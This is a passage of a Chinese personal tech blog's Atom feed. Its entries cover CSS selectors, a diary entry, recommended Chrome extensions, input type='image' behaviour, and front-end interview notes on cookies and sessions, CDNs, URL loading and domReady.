&lt;/style&gt;

&lt;p&gt;&lt;div class=&quot;demo&quot;&gt;&lt;br&gt;    &lt;span id=&quot;zc&quot;&gt;demo-div&lt;/span&gt;&lt;br&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p class=&quot;demo&quot;&gt;&lt;br&gt;    &lt;span id=&quot;zc&quot;&gt;demo-p&lt;/span&gt;&lt;br&gt;&lt;/p&gt;



&lt;p&gt;其中后代选择器作用是通过空格的形式来筛选元素。否则变为了设置改id(class)的元素了。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;子元素选择器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;子元素选择器和后台选择器从语义上来区分我还是真的有点模糊。从范围来看应该是后代选择器&amp;gt;子代选择器。子代选择器就是亲儿子嘛！&lt;/p&gt;
&lt;p&gt;&lt;b&gt;语法&lt;/b&gt;&lt;br&gt;    使用子结合符（&amp;gt;）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;=====style=====
h3 &amp;gt; span{
    color:red;
}
=====html======
&amp;lt;h3&amp;gt;
    &amp;lt;span&amp;gt;大儿子&amp;lt;/span&amp;gt;
    &amp;lt;span&amp;gt;二儿子&amp;lt;/span&amp;gt;
&amp;lt;/h3&amp;gt;
&amp;lt;h3&amp;gt;
    &amp;lt;em&amp;gt;
        &amp;lt;span&amp;gt;大孙子&amp;lt;/span&amp;gt;
    &amp;lt;/em&amp;gt;
    &amp;lt;span&amp;gt;二儿子&amp;lt;/span&amp;gt;
&amp;lt;/h3&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;style&gt;
    h3.demo &gt; span{
            color:red;
    }
&lt;/style&gt;
&lt;h3 class=&quot;demo&quot;&gt;&lt;span&gt;大儿子&lt;/span&gt;&amp;nbsp;&amp;nbsp;&lt;span&gt;二儿子&lt;/span&gt;&lt;/h3&gt;
&lt;h3 class=&quot;demo&quot;&gt;&lt;em&gt;&lt;span&gt;大孙子&lt;/span&gt;&lt;/em&gt;&amp;nbsp;&amp;nbsp;&lt;span&gt;二儿子&lt;/span&gt;&lt;/h3&gt;


* 相邻兄弟选择器

相邻兄弟嘛，就必须&lt;em&gt;同一个父母&lt;/em&gt;，并且只能选择紧邻的一个。

&lt;b&gt;语法&lt;/b&gt;
    相邻兄弟结合符，通过（＋）来表示
我觉得通过list来解释还比较清晰。


        =======style=====
        li + li{
            color: #6495ED;
        }
        =======html======
        &lt;ol&gt;
            &lt;li&gt;list1&lt;/li&gt;
            &lt;li&gt;list2&lt;/li&gt;
            &lt;li&gt;list3&lt;/li&gt;
        &lt;/ol&gt;

        //其中list1不能被选择，而list2是list1的兄弟，同时list3也是list1的兄弟。所以，表现如下！

&lt;style&gt;
    .demo li + li{
            color:#6495ED;
        }    
&lt;/style&gt;

&lt;ol class=&quot;demo&quot;&gt;&lt;br&gt;    &lt;li&gt;list1&lt;/li&gt;&lt;br&gt;    &lt;li&gt;list2&lt;/li&gt;&lt;br&gt;    &lt;li&gt;list3&lt;/li&gt;&lt;br&gt;&lt;/ol&gt;



&lt;ul&gt;
&lt;li&gt;伪类&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最常用的就是a标签的几个了。:link, :visited, :hover, :active(love-hate)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;伪元素&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中在编辑页面是可能回经常用到 :first-line[第一行], :first-letter[第一个字母], ::selection[选取内容] ， not(p)［非p的内容］ &lt;/p&gt;
&lt;p&gt;其中伪元素还有限定的属性&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:left&quot;&gt;first_letter&lt;/th&gt;
&lt;th style=&quot;text-align:right&quot;&gt;first_line&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;所有font属性&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;所有font属性&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;color&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;color&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;所有background属性&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;所有background属性&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;所有margin熟悉&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;word-spacing&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;所有padding&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;letter-spacing&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;所有border&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;text-decoration&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;text-decoration&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;vertical-align&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;vertical-align&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;text-transform&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;text-transform&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;line-height&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;line-height&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;clear&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;float&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;text-shadow&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;letter-spacing&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;word-spacing&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;clean&lt;/td&gt;
&lt;td style=&quot;text-align:right&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;text-shadow&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;####参考资料&lt;br&gt;&lt;a href=&quot;http://www.w3school.com.cn/css/index.asp&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.w3school.com.cn/css/index.asp&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;我认为css的选择器目的就是我们提供了一个快捷的方式，而我们常用的无非就是元素、类、ID等几种选择器，而其他的几种使用的真的是不多。但是在有的情况下使用这些选择器，你会发现效率大大提高。&lt;/p&gt;
&lt;p&gt;(PS: 尼玛，才发现之前写过总结过一次)&lt;/p&gt;
&lt;h4 id=&quot;选择器种类&quot;&gt;&lt;a href=&quot;#选择器种类&quot; class=&quot;headerlink&quot; title=&quot;选择器种类&quot;&gt;&lt;/a&gt;选择器种类&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;元素选择器&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;#css代码
div{background:#ccc;}
zc{background:#ccc;}

#html代码
&amp;lt;div&amp;gt;
    &amp;lt;span&amp;gt;这是一段文字&amp;lt;/span&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;zc&amp;gt;这是自定义标签&amp;lt;/zc&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;b&gt;展示如下&lt;/b&gt;&lt;/p&gt;
&lt;zc style=&quot;background:#ccc;display:border;&quot;&gt;这是自定义标签&lt;/zc&gt;

&lt;div style=&quot;background:#ccc&quot;&gt;&lt;span&gt;这是一段文字&lt;/span&gt;&lt;/div&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://zchub.cn/tags/front-end/"/>
    
      <category term="css" scheme="http://zchub.cn/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>dairy-2015/12/21</title>
    <link href="http://zchub.cn/2015/12/21/dairy-2015-12-21/"/>
    <id>http://zchub.cn/2015/12/21/dairy-2015-12-21/</id>
    <published>2015-12-21T20:45:12.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##沉思录&lt;/p&gt;
&lt;p&gt;每当一个人的灵魂空虚的时候，就容易想得多。来了杭州一个月，身上没有什么变化。和当初来之前下的决心有很大的距离，之前是打算学点东西。但是这一个月下来，我发现自己除了玩得比较厉害，其他没什么不同。我很幸运，遇到的公司的基础设施非常的好，资源也非常滴丰厚，可自己并没有好好地利用。&lt;/p&gt;
&lt;p&gt;走的时候，栋哥也是嘱咐我，不要忘记自己，要随时都要有一颗学习的心。不过回想这一个月以来干了什么？工作日上班，周日睡和吃（不过也不见长，有屁用！）。&lt;/p&gt;
&lt;p&gt;思前想后，觉得这样下去，肯定是要出问题的，必须要纠正自己的道路。所以，在自己的博客当中认真的写下这篇日记，以做警惕。不要迷失自己，未来竞争会越来越大。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##沉思录&lt;/p&gt;
&lt;p&gt;每当一个人的灵魂空虚的时候，就容易想得多。来了杭州一个月，身上没有什么变化。和当初来之前下的决心有很大的距离，之前是打算学点东西。但是这一个月下来，我发现自己除了玩得比较厉害，其他没什么不同。我很幸运，遇到的公司的基础设施非常的好，资源也非常滴丰厚
    
    </summary>
    
      <category term="生活日记" scheme="http://zchub.cn/categories/%E7%94%9F%E6%B4%BB%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="dairy" scheme="http://zchub.cn/tags/dairy/"/>
    
  </entry>
  
  <entry>
    <title>chrome扩展程序</title>
    <link href="http://zchub.cn/2015/11/09/chrome-crx/"/>
    <id>http://zchub.cn/2015/11/09/chrome-crx/</id>
    <published>2015-11-09T19:19:51.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##自言自语&lt;br&gt;今天斗捣鼓了一下chrome，发现我之前看到的只是冰山一角。通过今天下午，自己对chrome的喜爱又增加了异步！&lt;/p&gt;
&lt;p&gt;##what is the cre&lt;br&gt;什么是chrome扩展程序呢？&lt;br&gt;扩展程序是一些能够修改或增强Chrome浏览器功能的小程序。就是我们平时写的网页应用[html、css、javascript]等，如果你想自己开发需要到&lt;a href=&quot;chrome://extensions/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;chrome://extensions/&lt;/a&gt;下打包扩展。&lt;/p&gt;
&lt;p&gt;&lt;b&gt;温馨提示：&lt;/b&gt;亲，必须是chrome浏览器哟！&lt;br&gt;但是，Google需要收$5的开发者费用意思意思。当然并不是生财之道，为了防止恶意程序。&lt;/p&gt;
&lt;p&gt;开发教程：&lt;a href=&quot;http://blog.jobbole.com/46608/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.jobbole.com/46608/&lt;/a&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;##干货&lt;/p&gt;
&lt;p&gt;环境：&lt;b&gt;chrome浏览器&lt;/b&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.ggfwzs.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;谷歌访问助手&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;为了访问谷歌商店，这个是必须的。安装之后之后我们就可以使用谷歌搜索，谷歌商店等功能。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/%E7%A9%BF%E8%B6%8A/njdjpgffklilbojbobbfecfcgofebbco?hl=zh-CN&amp;amp;utm_source=chrome-ntp-launcher&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;穿越&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;b&gt;免费！！！&lt;/b&gt;我们每天可以累计使用两个小时，还是比较爽滴。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb?hl=zh-CN&amp;amp;utm_source=chrome-ntp-launcher&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;vimium&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;vim+chromium 快捷键操作浏览器，觉得非常的炫酷。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;当然作为一个前端程序员，还是要有点专业精神。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg?hl=zh-CN&amp;amp;utm_source=chrome-ntp-launcher&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;chrome useragent spoofer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;chrome用户代理，可以欺骗服务端，模拟各种浏览器。同时包括了Android，IOS等。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/window-resizer/kkelicaakdanhinjdeammmilcgefonfh?hl=zh-CN&amp;amp;utm_source=chrome-ntp-launcher&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;resize window&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;调节浏览器窗口大小，可以调节在开发或学习响应式界面的时候worked。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/web%E5%89%8D%E7%AB%AF%E5%8A%A9%E6%89%8Bfehelper/pkgccpejnmalmdinmhkkfafefagiiiad?hl=zh-CN&amp;amp;utm_source=chrome-ntp-launcher&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;FeHelper&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;WEB前端助手,&lt;a href=&quot;http://www.baidufe.com/fehelper&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;介绍&lt;/a&gt;。功能包括字符串编解码、图片base64编码、代码压缩、美化、JSON格式化、正则表达式、时间转换工具、二维码生成器、编码规范检测、页面性能检测、栅格检测、JS运行效率分析等，异常强大。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/markdown-editor/ekdcaddpmiodcipjfmffhhefijpdckaf?hl=zh-CN&amp;amp;utm_source=chrome-ntp-launcher&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;markdownEditor&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于经常使用markdown的小盆友应该灰常喜欢。离线应用，然后非常简洁。不过我发现使用中也有不好的地方，就是没有高亮效果。如果字多了就显得混乱。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/octotree/bkhaagjahfmjljalopjnoealnfndnagc?hl=zh-CN&amp;amp;utm_source=chrome-ntp-launcher&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Octotree&lt;/a&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;github插件，在我们查看github项目的时候，给我们提供一个树形结构的视图。同时，该插件还支持下载项目中的文件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;music &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/earbits-radio-free-music/mgkjffcdjblaipglnmhanakilfbniihj?hl=zh-CN&amp;amp;utm_source=chrome-ntp-launcher&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Earbits电台&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;发现自己并不会使用，哈哈。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/%E8%99%BE%E5%A3%B3-musiccase/pliopboejkkmebobeabhdpmpngigicig?hl=zh-CN&amp;amp;utm_source=chrome-ntp-launcher&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;虾壳&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;喜爱小虾米的用户的福音。目前，本人正使用该插件，听着歌，敲着字。嗯，惬意。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;games&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/codetank/akhhjlibdipmbloibedinfhloejbbkok?hl=zh-CN&amp;amp;utm_source=chrome-ntp-launcher&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;codetank&lt;/a&gt;&lt;br&gt;tencent开发的基于html5,javascript的游戏，同时开发者可以自己根据API来写自己的游戏。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;更多资源：&lt;a href=&quot;https://www.baidu.com/link?url=VHYgrtLwh4nj3tcwZV2BwMizP_NTBhR_t-p5OYulLDe8hyrAdDjlzAlo_he0k84a&amp;amp;wd=&amp;amp;eqid=b5db42140003714f0000000556409c05&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.baidu.com/link?url=VHYgrtLwh4nj3tcwZV2BwMizP_NTBhR_t-p5OYulLDe8hyrAdDjlzAlo_he0k84a&amp;amp;wd=&amp;amp;eqid=b5db42140003714f0000000556409c05&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##自言自语&lt;br&gt;今天斗捣鼓了一下chrome，发现我之前看到的只是冰山一角。通过今天下午，自己对chrome的喜爱又增加了异步！&lt;/p&gt;
&lt;p&gt;##what is the cre&lt;br&gt;什么是chrome扩展程序呢？&lt;br&gt;扩展程序是一些能够修改或增强Chrome浏览器功能的小程序。就是我们平时写的网页应用[html、css、javascript]等，如果你想自己开发需要到&lt;a href=&quot;chrome://extensions/&quot;&gt;chrome://extensions/&lt;/a&gt;下打包扩展。&lt;/p&gt;
&lt;p&gt;&lt;b&gt;温馨提示：&lt;/b&gt;亲，必须是chrome浏览器哟！&lt;br&gt;但是，Google需要收$5的开发者费用意思意思。当然并不是生财之道，为了防止恶意程序。&lt;/p&gt;
&lt;p&gt;开发教程：&lt;a href=&quot;http://blog.jobbole.com/46608/&quot;&gt;http://blog.jobbole.com/46608/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="daily-toy" scheme="http://zchub.cn/categories/daily-toy/"/>
    
    
      <category term="chrome" scheme="http://zchub.cn/tags/chrome/"/>
    
      <category term="crx" scheme="http://zchub.cn/tags/crx/"/>
    
  </entry>
  
  <entry>
    <title>表单类型image</title>
    <link href="http://zchub.cn/2015/11/05/input-type-image/"/>
    <id>http://zchub.cn/2015/11/05/input-type-image/</id>
    <published>2015-11-05T10:26:15.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##问题概述&lt;br&gt;今天在写页面的时候发现&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;form action=&amp;quot;test.html&amp;quot;&amp;gt;
    &amp;lt;input type=&amp;quot;image&amp;quot;/&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在页面上显示的有个“提交”，但是我并没有写什么内容，有点郁闷。为什么呢？难道它和“type=submit”的效果相同？经验证发现是这样的。点击它会跳转页面&lt;/p&gt;
&lt;p&gt;##问题发散&lt;br&gt;使用“type=image”实质创建了一个图片控件，在点击的过程中我发现它会记录鼠标点击图片的位置，即像素点相对图片的位置。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file:///C:/Users/Administor/Desktop/c.html?x=94&amp;amp;y=66
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;##问题实质&lt;/p&gt;
&lt;p&gt;由于有与“submit”类似的“提交”功能，所以我们应避免使用。这样的会造成页面的二次提交。&lt;/p&gt;
&lt;p&gt;##解决办法&lt;/p&gt;
&lt;p&gt;1.不使用该标签,使用image标签代替&lt;/p&gt;
&lt;p&gt;2.阻止事件的默认行为&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;input type=&amp;quot;image&amp;quot; src=&amp;quot;../img/demo.jpg&amp;quot; onclick=&amp;quot;operate();return false;&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;</content>
    
    <summary type="html">
    
      &lt;p&gt;##问题概述&lt;br&gt;今天在写页面的时候发现&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;form action=&amp;quot;test.html&amp;quot;&amp;gt;
    &amp;lt;input type=&amp;quot;image&amp;quot;/&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="input" scheme="http://zchub.cn/tags/input/"/>
    
      <category term="type" scheme="http://zchub.cn/tags/type/"/>
    
      <category term="image" scheme="http://zchub.cn/tags/image/"/>
    
  </entry>
  
  <entry>
    <title>9月20日面试总结</title>
    <link href="http://zchub.cn/2015/09/20/summary-interview-before-20th-Sep/"/>
    <id>http://zchub.cn/2015/09/20/summary-interview-before-20th-Sep/</id>
    <published>2015-09-20T11:25:26.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##概述&lt;br&gt;虽然有机会参加百度和腾讯的面试，但是结果并不是很理想。目前已经双双败下阵来。如果说很难也谈不上，就是一些常见的基础问题。其中腾讯在技术上更侧重于深度，而且特别喜欢问计算机网络的知识。而百度就是原生的js操作问题多一点。不过每一个问题还是特别有意思。&lt;/p&gt;
&lt;p&gt;##问题&lt;br&gt;1.Cookie与sessionID是怎么传送&lt;br&gt;Cookie是服务器在本地机器上存的一段文本。&lt;br&gt;Cookie对应字段Cookie:客户端传送&lt;br&gt;Set-cookie：服务器向客户端设置cookie&lt;br&gt;cookie的使用：是由浏览器按照一定的原则在后台自动发送给服务器，如果没有规定过期时间，就是浏览器会话期。这种一般存在内存中，而不是写在硬盘上。如果设置了过期时间，就写在硬盘上。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Session是针对每个用户的，是保存在服务器上，用sessionID来区分是哪个用户变量。其中Session更加安全，因为它不会随意读取用户信息。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Session机制&lt;br&gt;  Session以类似散列集方式（可能用散列集）存储。当要创建时，先检查，没有再创建，并返回给客户端保存。（sessionID既不能重复，也不能随意找到）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Session的实现方式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用cookie来实现&lt;br&gt;服务器给每个Session分配一个唯一的JSESSIONID，并通过Cookie发送给客户端。方式Set-cookie:JSESSIONID&lt;/li&gt;
&lt;li&gt;使用URL回显的方式&lt;br&gt;服务器给浏览器的所有连接url中有JSESSIONID这个字段，在每次客户端点击连接都会传送该JSESSIONID,如果匹配不到就失败。（tomcat采取了这两种方式，其中&lt;b&gt;JSESSIONID只是tomcat对sessionid的称呼&lt;/b&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2.CDN（content delivery network）如何放置？怎么获取的资源&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;技术原理&lt;br&gt;  负载均衡分布，网络传送上利用缓存技术，就近获取资源。减少网络中冗余数据的重复传输，使之最小化，将广域传输转为本地或就近访问。多台Cache加速服务器且分布在不同地域，需要通过有效地机制管理Cache网络，引导用户就近访问，全局负载均衡流量。复制到网络“边缘”，缩小“请求点”与“交互点”。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;传送内容&lt;br&gt;  互联网上传递的内容，大部分为重复的Web/FTP数据。Cache服务器具有缓存，优化数据链路性能，大部分为网页对象：（web Page object,html 等页面文件，图片文件）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;工作流程与原理&lt;/p&gt;
&lt;p&gt;  &lt;img src=&quot;http://7xklhg.com1.z0.glb.clouddn.com/cdn_throry.png&quot; alt=&quot;http://7xklhg.com1.z0.glb.clouddn.com/cdn_throry.png&quot;&gt;&lt;br&gt;  CDN中间添加了Cache层，然后通过接管DNS来引导数据获得源服务器的数据。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;技术手段&lt;br&gt;  高速缓存、镜像服务器。适用于(静态和准动态数据同步)&lt;/p&gt;
&lt;p&gt;  全局负载均衡DNS通过一组预先定义好的策略，将当时最接近用户的节点地址提供给用户，使用户能够得到快速的服务。&lt;/p&gt;
&lt;p&gt;  负载均衡设备负责每个节点中各个Cache的负载均衡，保证节点的工作效率；同时，负载均衡设备还负责收集节点与周围环境的信息，保持与全局负载DNS的通信，实现整个系统的负载均衡。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;　　高速缓存服务器（Cache）负责存储客户网站的大量信息，就像一个靠近用户的网站服务器一样响应本地用户的访问请求。&lt;/p&gt;
&lt;p&gt;3.实现格雷码&lt;/p&gt;
&lt;p&gt;1——[0，1]&lt;/p&gt;
&lt;p&gt;2——[00,01,10,11]&lt;/p&gt;
&lt;p&gt;3——[000,001,010,100,011,101,110,111]&lt;/p&gt;
&lt;p&gt;之前觉得这道题不是很难，觉得就是通过把数字转换为2进制就结束了。但是忽略了一点就是。每行的数字个数相同，在3的时候，0的对应形式为‘000’，而不是‘0’。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function getGreenCode(n){
    var len = Math.pow(2,n);
    var arr = [];
    var temp=&amp;apos;&amp;apos;;
    for(var j=0;j&amp;lt;n;j++){
        temp+=0;
    }
    for(var i=0;i&amp;lt;len;i++){
    //加“0”操作
        var str = temp+i.toString(2);
        arr.push(str.substr(str.length-n));
    }
    return arr;
};
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4.在浏览器加载url的过程&lt;br&gt;这道题也是常考的问题，没有绝对的答案。可以扩展的内容太多。恰巧这种题就非常考验我们的知识面，所以是一道可以提高我们分值的题目。&lt;/p&gt;
&lt;p&gt;思路：结合计算机网络、操作系统、浏览器渲染原理来回答。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.浏览器分析链接指向页面的URL；

2.浏览器向DNS(域名系统)请求解析页面所对应域名的IP地址；（浏览器缓存-&amp;gt;系统缓存-&amp;gt;路由器缓存）

3.DNS(域名系统)解析出重庆理工大学的IP地址为“222.178.158.61”；

三次握手（第三次目的：防止已失效的连接请求报文段突然又传到了B，因而产生错误）

4.浏览器向服务器建立TCP连接(“IP”：222.178.158.61,“port”:80)；

5.浏览器发出取命令步骤：GET/yxsz/yxsz.html；

6.服务器 www.cqut.edu.cn 给出相应,把文件/yxsz/yxsz.html发给浏览器；

7.释放TCP连接。四次握手[客户端主动关闭，等待2MSL(maxinum segment lifetime),为了保证A发送的最后一个ACK报文段能够到达B;并防止“已失效的连接请求报文段”出现在连接中》）；

8.浏览器显示“院系设置”的页面。（浏览器原理、DOM加载过程）
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5.判断元素是否在区域内&lt;br&gt;一开始看到这个题非常懵，但是大致的思路就是通过原生的js来获取它的位置并比较。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var a = document.getElementById(&amp;quot;eq&amp;quot;).offsetTop;
if (a &amp;gt;= $(window).scrollTop() &amp;amp;&amp;amp; a &amp;lt; ($(window).scrollTop()+$(window).height())) {
    alert(&amp;quot;div在可视范围&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;6.元素js实现domready。&lt;br&gt;面试前一天还看过jquery的$(document).ready(fn)与window.onload的区别，没想到后一天就遇到了。但当时并没有思考如果通过原生js来实现domReady。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//简介版
function ready(callback){
    if(document.addEventListener){            //标准浏览器
        document.addEventListener(&amp;apos;DOMContentLoaded&amp;apos;,function(){
            document.removeEventListener(&amp;apos;DOMContentLoaded&amp;apos;,arguments.callee,false);    //注销时间，避免反复触发
            callback();        //执行函数
        },false);
    }else if(document.attachEvent){            //IE浏览器
        document.attachEvent(&amp;apos;onreadystatechange&amp;apos;,function(){
            if(document.readyState==&amp;apos;complete&amp;apos;){
                document.detachEvent(&amp;apos;onreadystatechange&amp;apos;,arguments.callee);
                callback();        //函数执行
            }
        });
    }else if(document.lastChild == document.body){
        callback();
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;$(document).ready(fn)与window.onload区别&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$(document).ready(fn)是在dom文档树加载完之后执行一个函数；window.onload是在dom文档树加载完和所有文件加载完之后执行一个函数。&lt;/p&gt;
&lt;ul&gt;
